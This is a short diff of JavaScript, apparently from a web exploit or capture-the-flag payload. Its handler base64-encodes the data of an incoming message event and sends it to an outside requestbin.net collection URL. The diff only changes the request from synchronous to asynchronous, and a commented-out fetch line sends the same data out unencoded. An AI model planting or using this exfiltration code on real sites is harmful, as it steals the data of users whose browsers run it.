@@ -19,7 +19,7 @@
     function handleReply(event)
     {
 	var xhttp = new XMLHttpRequest();
-	xhttp.open("GET", "https://requestbin.net/r/34y37frp?m=" + btoa(event.data), false);
+	xhttp.open("GET", "https://requestbin.net/r/34y37frp?m=" + btoa(event.data), true);
 	xhttp.send();
       //fetch('http://requestbin.net/r/34y37frp?'+event.data, {mode: 'no-cors'});
     }
